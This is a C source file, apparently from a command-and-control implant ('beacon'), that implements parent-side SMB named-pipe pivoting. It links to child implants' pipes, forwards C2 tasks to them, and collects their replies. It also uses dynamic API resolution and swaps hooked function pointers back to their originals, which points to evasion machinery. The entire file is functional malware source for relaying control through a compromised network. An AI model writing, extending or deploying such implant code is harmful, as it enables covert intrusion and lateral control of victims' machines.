/* beacon/src/Commands/Pivot.c
 * Parent-side pivot manager: link/unlink/pivot_exec + ProcessPivots.
 *
 * NAX_CMD_LINK      - connect to child's named pipe, read beat, store pivot
 * NAX_CMD_UNLINK    - disconnect a linked child
 * NAX_CMD_PIVOT_EXEC- write data to child's pipe (tasks from C2)
 * NaxProcessPivots  - poll all pivot read events, collect child responses */

#include "Nax.h"
#include "Pivot.h"
#include "Transport.h"
#include "Pipe.h"

/* ========= [ post async header read ] ========= */

FUNC VOID NaxPostPivotHeaderRead( PNAX_INSTANCE Nax, NAX_PIVOT* p ) {
    if ( p->Async->RdPending )
        return;
    p->Async->RdHeader = 0;
    Nax->Kernel32.ResetEvent( p->Async->OvRead.hEvent );
    DWORD nRead = 0;
    BOOL ok = Nax->Kernel32.ReadFile( p->hPipe, &p->Async->RdHeader, 4, &nRead, &p->Async->OvRead );
    if ( ok ) {
        Nax->Kernel32.SetEvent( p->Async->OvRead.hEvent );
        p->Async->RdPending = TRUE;
    } else if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING ) {
        p->Async->RdPending = TRUE;
    }
}

/* ========= [ CMD_LINK ] ========= */

FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 6 )
        return NAX_ERR_INVAL;

    BYTE   linkType   = args[0];
    UINT32 nameLen    = *(UINT32*)( args + 1 );
    if ( 5 + nameLen > args_len || nameLen > 512 )
        return NAX_ERR_INVAL;

    CHAR pipePath[520];
    MmZero( pipePath, 520 );
    MmCopy( pipePath, args + 5, nameLen );

    HANDLE hPipe = Nax->Kernel32.CreateFileA( pipePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL );
    if ( hPipe == INVALID_HANDLE_VALUE ) {
        *(UINT32*)out = Nax->Kernel32.GetLastError();
        *out_len = 4;
        return NAX_ERR_NET;
    }

    DWORD dwMode = PIPE_READMODE_MESSAGE;
    Nax->Kernel32.SetNamedPipeHandleState( hPipe, &dwMode, NULL, NULL );

    /* read beat from child: [4-byte len][beat data] */
    HANDLE hTempEvent = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );
    if ( ! hTempEvent ) {
        Nax->Kernel32.CloseHandle( hPipe );
        return NAX_ERR_NOMEM;
    }

    UINT32 beatLen = 0;
    if ( ! NaxPipeRead( Nax, hPipe, hTempEvent, (PBYTE)&beatLen, 4 ) || beatLen == 0 || beatLen > 0x100000 ) {
        Nax->Ntdll.NtClose( hTempEvent );
        Nax->Kernel32.CloseHandle( hPipe );
        return NAX_ERR_NET;
    }

    PBYTE beatBuf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, beatLen );
    if ( ! beatBuf ) {
        Nax->Ntdll.NtClose( hTempEvent );
        Nax->Kernel32.CloseHandle( hPipe );
        return NAX_ERR_NOMEM;
    }

    if ( ! NaxPipeRead( Nax, hPipe, hTempEvent, beatBuf, beatLen ) ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
        Nax->Ntdll.NtClose( hTempEvent );
        Nax->Kernel32.CloseHandle( hPipe );
        return NAX_ERR_NET;
    }
    Nax->Ntdll.NtClose( hTempEvent );

    NAX_PIVOT_ASYNC* async = (NAX_PIVOT_ASYNC*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_PIVOT_ASYNC ) );
    if ( ! async ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
        Nax->Kernel32.CloseHandle( hPipe );
        return NAX_ERR_NOMEM;
    }
    MmZero( async, sizeof( NAX_PIVOT_ASYNC ) );
    async->OvRead.hEvent = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );
    async->hWriteEvent   = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );

    NAX_PIVOT* pivot = (NAX_PIVOT*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_PIVOT ) );
    if ( ! pivot ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, async );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
        Nax->Kernel32.CloseHandle( hPipe );
        return NAX_ERR_NOMEM;
    }
    MmZero( pivot, sizeof( NAX_PIVOT ) );
    pivot->hPipe = hPipe;
    pivot->Async = async;
    pivot->Id    = taskId;
    pivot->Next  = Nax->PivotHead;
    Nax->PivotHead = pivot;

    NaxPostPivotHeaderRead( Nax, pivot );

    /* result: linkType(1) | watermark(4LE) | sessionId(16) | encrypted_data */
    if ( beatLen < 4 ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
        return NAX_ERR_INVAL;
    }
    UINT32 resultLen = 1 + beatLen;
    if ( resultLen > *out_len ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
        return NAX_ERR_NOMEM;
    }
    out[0] = linkType;
    MmCopy( out + 1, beatBuf, beatLen );
    *out_len = resultLen;

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
    return NAX_OK;
}

/* ========= [ CMD_UNLINK ] ========= */

FUNC INT CmdUnlink( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 4 )
        return NAX_ERR_INVAL;

    UINT32 pivotId = *(UINT32*)args;
    BYTE   result  = 0;

    NAX_PIVOT** pp = &Nax->PivotHead;
    while ( *pp ) {
        NAX_PIVOT* p = *pp;
        if ( p->Id == pivotId ) {
            if ( p->Async->RdPending )
                Nax->Kernel32.CancelIo( p->hPipe );
            Nax->Kernel32.FlushFileBuffers( p->hPipe );
            Nax->Kernel32.DisconnectNamedPipe( p->hPipe );
            Nax->Kernel32.CloseHandle( p->hPipe );
            if ( p->Async->OvRead.hEvent )
                Nax->Ntdll.NtClose( p->Async->OvRead.hEvent );
            if ( p->Async->hWriteEvent )
                Nax->Ntdll.NtClose( p->Async->hWriteEvent );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, p->Async );
            *pp = p->Next;
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, p );
            result = 1; /* SMB type */
            break;
        }
        pp = &p->Next;
    }

    /* result: pivot_id(4LE) | pivot_type(1) */
    *(UINT32*)out = pivotId;
    out[4] = result;
    *out_len = 5;
    return NAX_OK;
}

/* ========= [ CMD_PIVOT_EXEC ] ========= */

FUNC INT CmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 8 )
        return NAX_ERR_INVAL;

    UINT32 pivotId  = *(UINT32*)( args );
    UINT32 dataLen  = *(UINT32*)( args + 4 );
    if ( 8 + dataLen > args_len )
        return NAX_ERR_INVAL;

    if ( dataLen == 0 ) {
        *out_len = 0;
        return NAX_OK;
    }

    PBYTE data = (PBYTE)( args + 8 );

    NAX_PIVOT* p = Nax->PivotHead;
    while ( p ) {
        if ( p->Id == pivotId ) {
            NaxPipeWrite( Nax, p->hPipe, p->Async->hWriteEvent, data, dataLen );
            p->Async->DataSent = TRUE;
            break;
        }
        p = p->Next;
    }

    *out_len = 0;
    return NAX_OK;
}

/* ========= [ ProcessPivots - collect child responses ] ========= */


FUNC UINT32 NaxProcessPivots( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
    UINT32 written = 0;
    NAX_PIVOT** pp = &Nax->PivotHead;

    typedef DWORD (WINAPI *FN_WFSO)( HANDLE, DWORD );
    FN_WFSO realWfso = (FN_WFSO)Nax->Kernel32.WaitForSingleObject;
    for ( UINT32 i = 0; i < Nax->GateSwaps.Count; i++ ) {
        if ( Nax->GateSwaps.Entries[i].Slot == (PVOID*)&Nax->Kernel32.WaitForSingleObject ) {
            realWfso = (FN_WFSO)Nax->GateSwaps.Entries[i].Original;
            break;
        }
    }

    while ( *pp ) {
        NAX_PIVOT* p = *pp;
        BOOL broken = FALSE;

        NaxPostPivotHeaderRead( Nax, p );
        if ( ! p->Async->RdPending ) {
            broken = TRUE;
            goto _cleanup;
        }

        DWORD  waitMs   = 0;
        UINT64 deadline = 0;
        if ( p->Async->DataSent ) {
            waitMs   = 2000;
            deadline = Nax->Kernel32.GetTickCount64() + 2000;
            NaxDbg( Nax, "[pivot] DataSent=1 for pivot %08x, waitMs=%u", p->Id, waitMs );
        }
        p->Async->DataSent = FALSE;

        UINT32 msgCount = 0;
        while ( 1 ) {
            DWORD w = realWfso( p->Async->OvRead.hEvent, waitMs );
            if ( w == WAIT_TIMEOUT ) {
                NaxDbg( Nax, "[pivot] wait timeout after %u msgs (waitMs=%u)", msgCount, waitMs );
                break;
            }
            if ( w != WAIT_OBJECT_0 ) { broken = TRUE; break; }

            DWORD nRead = 0;
            if ( ! Nax->Kernel32.GetOverlappedResult( p->hPipe, &p->Async->OvRead, &nRead, FALSE ) ) {
                if ( Nax->Kernel32.GetLastError() == ERROR_IO_INCOMPLETE )
                    break;
                broken = TRUE;
                break;
            }
            p->Async->RdPending = FALSE;
            UINT32 msgLen = p->Async->RdHeader;
            if ( msgLen == 0 || msgLen > 0x1000000 ) { broken = TRUE; break; }

            PBYTE msgBuf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, msgLen );
            if ( ! msgBuf ) { broken = TRUE; break; }

            HANDLE hEvt = p->Async->OvRead.hEvent;
            if ( ! NaxPipeRead( Nax, p->hPipe, hEvt, msgBuf, msgLen ) ) {
                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, msgBuf );
                broken = TRUE;
                break;
            }
            msgCount++;
            NaxDbg( Nax, "[pivot] read msg #%u from pivot %08x (%u bytes)", msgCount, p->Id, msgLen );

            UINT32 entryBody = 1 + 4 + 4 + msgLen;
            if ( written + 4 + entryBody <= out_cap ) {
                PBYTE cur = out + written;
                *(UINT32*)cur = entryBody;
                cur[4] = NAX_PIV_TYPE_DATA;
                *(UINT32*)( cur + 5 ) = p->Id;
                *(UINT32*)( cur + 9 ) = msgLen;
                MmCopy( cur + 13, msgBuf, msgLen );
                written += 4 + entryBody;
            }
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, msgBuf );

            if ( deadline ) {
                UINT64 now = Nax->Kernel32.GetTickCount64();
                waitMs = ( now >= deadline ) ? 0 : (DWORD)( deadline - now );
            }
            if ( waitMs > 100 )
                waitMs = 100;

            NaxPostPivotHeaderRead( Nax, p );
            if ( ! p->Async->RdPending ) break;
        }

    _cleanup:
        if ( broken ) {
            Nax->Kernel32.CancelIo( p->hPipe );
            Nax->Kernel32.CloseHandle( p->hPipe );
            if ( p->Async->OvRead.hEvent )
                Nax->Ntdll.NtClose( p->Async->OvRead.hEvent );
            if ( p->Async->hWriteEvent )
                Nax->Ntdll.NtClose( p->Async->hWriteEvent );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, p->Async );

            UINT32 entryBody = 1 + 4 + 1;
            if ( written + 4 + entryBody <= out_cap ) {
                PBYTE cur = out + written;
                *(UINT32*)cur = entryBody;
                cur[4] = NAX_PIV_TYPE_UNLINK;
                *(UINT32*)( cur + 5 ) = p->Id;
                cur[9] = 10; /* PIVOT_TYPE_DISCONNECT */
                written += 4 + entryBody;
            }

            *pp = p->Next;
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, p );
        } else {
            pp = &p->Next;
        }
    }
    return written;
}
